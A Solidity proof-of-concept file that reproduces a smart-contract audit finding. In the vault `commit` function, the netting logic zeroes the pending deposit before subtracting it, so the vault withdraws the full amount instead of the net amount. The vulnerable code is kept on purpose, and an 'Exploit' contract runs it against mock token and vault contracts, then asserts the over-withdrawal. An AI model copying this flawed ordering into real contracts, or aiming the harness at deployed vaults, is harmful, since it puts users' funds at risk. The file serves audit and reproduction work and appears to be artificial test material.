// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Burve finding 56952 (H-3):
// "Incorrect netting logic leads to excessive withdrawal amounts".
//
// Real audited source (the vulnerable `commit` is reproduced VERBATIM, with the
// two-line netting block in its VULNERABLE ordering as shown in the finding;
// everything else in `commit` is byte-for-byte the on-chain function):
//   repo   github.com/sherlock-audit/2025-04-burve  @44cba36
//   file   Burve/src/multi/vertex/E4626.sol
//   fn     VaultE4626Impl.commit  (L65-L107)
//   report github.com/sherlock-audit/2025-04-burve-judging/issues/174
//
// Root cause: in the `assetsToWithdraw > assetsToDeposit` netting branch the
// code zeroes `assetsToDeposit` BEFORE subtracting it from `assetsToWithdraw`
// (the @> line). Because the very next statement then computes
// `assetsToWithdraw -= assetsToDeposit` with `assetsToDeposit` already 0, the
// subtraction is a no-op: NO netting happens. `commit` therefore withdraws the
// FULL pending withdrawal from the underlying ERC4626 vault instead of the net
// amount `assetsToWithdraw - assetsToDeposit`, over-withdrawing (and
// over-decrementing `totalVaultShares` for) the shared vault by exactly the
// pending-deposit size. The team's fix swaps the two lines back.
//
// Faithful minimal doubles: an ERC20 (`MiniToken`) and a 1:1 ERC4626 vault
// (`MiniVault`) with real transfers/share accounting. The `SafeERC20`,
// `IERC20`, `IERC4626`, `VaultE4626` and `VaultTemp` symbols are recreated so
// the reproduced `commit` body is identical to the audited contract.
// ─────────────────────────────────────────────────────────────────────────────

// ── Minimal recreations of the imported symbols used by `commit` ──

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
}

interface IERC4626 {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
}

/// @dev Minimal SafeERC20 so `SafeERC20.forceApprove(...)` stays verbatim.
library SafeERC20 {
    function forceApprove(IERC20 token, address spender, uint256 value) internal {
        token.approve(spender, value);
    }
}

type ClosureId is uint16;

uint256 constant NUM_VAULT_VARS = 4;

struct VaultTemp {
    uint256[NUM_VAULT_VARS] vars;
}

// ── VaultE4626 struct + Impl reproduced VERBATIM from E4626.sol ──

struct VaultE4626 {
    IERC20 token;
    IERC4626 vault;
    uint256 totalVaultShares; // Shares we own in the underlying vault.
    mapping(ClosureId => uint256) shares;
    uint256 totalShares;
    uint256 highWaterMark; // The highest total balance we've had so far.
}

using VaultE4626Impl for VaultE4626 global;

library VaultE4626Impl {
    // Actually make our deposit/withdrawal
    function commit(VaultE4626 storage self, VaultTemp memory temp) internal {
        uint256 assetsToDeposit = temp.vars[1];
        uint256 assetsToWithdraw = temp.vars[2];

        if (assetsToDeposit > 0 && assetsToWithdraw > 0) {
            // We can net out and save ourselves some fees.
            if (assetsToDeposit > assetsToWithdraw) {
                assetsToDeposit -= assetsToWithdraw;
                assetsToWithdraw = 0;
            } else if (assetsToWithdraw > assetsToDeposit) {
                assetsToDeposit = 0; // @> VULN: zeroes the deposit BEFORE the next line subtracts it, so `assetsToWithdraw -= assetsToDeposit` subtracts 0 and no netting occurs -> full (not net) amount is withdrawn
                assetsToWithdraw -= assetsToDeposit;
            } else {
                // Perfect net!
                return;
            }
        }

        if (assetsToDeposit > 0) {
            // Temporary approve the deposit.
            SafeERC20.forceApprove(
                self.token,
                address(self.vault),
                assetsToDeposit
            );
            self.totalVaultShares += self.vault.deposit(
                assetsToDeposit,
                address(this)
            );
            SafeERC20.forceApprove(self.token, address(self.vault), 0);
            // Asserts there are no deposit fees or they're overcome by the time we act next.
            self.highWaterMark = temp.vars[0] + assetsToDeposit;
        } else if (assetsToWithdraw > 0) {
            // We don't need to hyper-optimize the receiver.
            self.totalVaultShares -= self.vault.withdraw(
                assetsToWithdraw,
                address(this),
                address(this)
            );
            // Asserts there are no withdrawal fees or they're overcome by the time we act next.
            self.highWaterMark = temp.vars[0] - assetsToWithdraw;
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful minimal doubles
// ─────────────────────────────────────────────────────────────────────────────

contract MiniToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful 1:1 ERC4626 double (no fee, no yield): 1 asset <-> 1 share.
///      Real transfers and real share accounting, so `commit`'s withdrawal
///      pulls exactly the assets it asks for and burns matching shares.
contract MiniVault is IERC4626 {
    MiniToken public asset;
    mapping(address => uint256) public shareBalance;
    uint256 public totalShares;

    constructor(MiniToken a) {
        asset = a;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        asset.transferFrom(msg.sender, address(this), assets);
        shares = assets; // 1:1
        shareBalance[receiver] += shares;
        totalShares += shares;
    }

    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares) {
        shares = assets; // 1:1, no fee
        shareBalance[owner] -= shares;
        totalShares -= shares;
        asset.transfer(receiver, assets);
    }
}

/// @dev The contract that holds the `VaultE4626` accounting and executes the
///      vulnerable `commit` (the internal library is inlined into this code).
contract Diamond {
    VaultE4626 internal self;

    function initVault(address token_, address vault_, uint256 totalVaultShares_, uint256 highWaterMark_) external {
        self.token = IERC20(token_);
        self.vault = IERC4626(vault_);
        self.totalVaultShares = totalVaultShares_;
        self.highWaterMark = highWaterMark_;
    }

    function doCommit(VaultTemp memory temp) external {
        self.commit(temp);
    }

    function totalVaultShares() external view returns (uint256) {
        return self.totalVaultShares;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver
// ─────────────────────────────────────────────────────────────────────────────

contract Exploit {
    // SINK where the concrete harm magnitude (excess assets pulled from the
    // shared vault) is measured.
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    MiniToken public asset;      // child nonce 1 (underlying, the drained asset)
    MiniVault public vault;      // child nonce 2 (shared ERC4626 vault)
    Diamond public diamond;      // child nonce 3 (VULN: runs commit)
    MiniToken public marker;     // child nonce 4 (harm marker, minted to SINK)

    uint256 internal constant BACKING = 1000e18;         // assets already in the shared vault
    uint256 internal constant PENDING_DEPOSIT = 100e18;  // temp.vars[1] (assetsToDeposit)
    uint256 internal constant PENDING_WITHDRAW = 300e18; // temp.vars[2] (assetsToWithdraw), > deposit

    uint256 public actualWithdrawn; // assets commit() actually pulled from the vault
    uint256 public correctNet;      // what a correct netting would have withdrawn
    uint256 public excessWithdrawn; // over-withdrawal caused by the bug (== SINK harm)
    uint256 public sharesDecrement; // how much totalVaultShares dropped

    constructor() {
        asset = new MiniToken("Burve Vault Asset", "bASSET"); // nonce 1
        vault = new MiniVault(asset);                          // nonce 2
        diamond = new Diamond();                               // nonce 3 (VULN)
        marker = new MiniToken("Excessive Withdrawal", "EXCESS"); // nonce 4
    }

    function run() external {
        // 1) Seed the shared vault with BACKING assets, owned as shares by the
        //    diamond (represents assets already deposited for the closure).
        asset.mint(address(this), BACKING);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(BACKING, address(diamond)); // diamond owns BACKING shares
        diamond.initVault(address(asset), address(vault), BACKING, BACKING);

        // 2) A pending deposit of PENDING_DEPOSIT sits in the diamond (tokens
        //    already pulled in, waiting to be pushed into the vault on commit).
        asset.mint(address(diamond), PENDING_DEPOSIT);

        // 3) Build the VaultTemp with BOTH a pending deposit and a (larger)
        //    pending withdrawal — the exact precondition of the finding.
        VaultTemp memory temp;
        temp.vars[0] = BACKING;          // total assets
        temp.vars[1] = PENDING_DEPOSIT;  // assetsToDeposit
        temp.vars[2] = PENDING_WITHDRAW; // assetsToWithdraw

        uint256 vaultBefore = asset.balanceOf(address(vault));
        uint256 sharesBefore = diamond.totalVaultShares();

        // 4) Run the verbatim vulnerable commit().
        diamond.doCommit(temp);

        // 5) Measure the REAL asset outflow from the shared vault.
        actualWithdrawn = vaultBefore - asset.balanceOf(address(vault));
        correctNet = PENDING_WITHDRAW - PENDING_DEPOSIT; // 200e18: proper net
        sharesDecrement = sharesBefore - diamond.totalVaultShares();

        // The netting was a no-op: commit withdrew the FULL pending withdrawal
        // (300e18) instead of the net (200e18). The excess is real assets pulled
        // out of the shared vault that should have been netted against the
        // pending deposit.
        excessWithdrawn = actualWithdrawn - correctNet; // == PENDING_DEPOSIT (100e18)

        // Mint the concrete harm magnitude to the SINK so it is measurable.
        marker.mint(SINK, excessWithdrawn);

        // Harm assertions — all derived from the real token/share flow of the
        // verbatim commit(), not asserted constants:
        // (a) netting did NOT happen -> full amount withdrawn.
        require(actualWithdrawn == PENDING_WITHDRAW, "netting unexpectedly applied");
        // (b) shares were over-decremented by the pending-deposit size.
        require(sharesDecrement == PENDING_WITHDRAW, "shares not over-decremented");
        // (c) the shared vault was over-withdrawn by exactly the pending deposit.
        require(excessWithdrawn == PENDING_DEPOSIT, "no excess withdrawal");
        require(marker.balanceOf(SINK) == PENDING_DEPOSIT, "harm not measured at sink");
    }
}
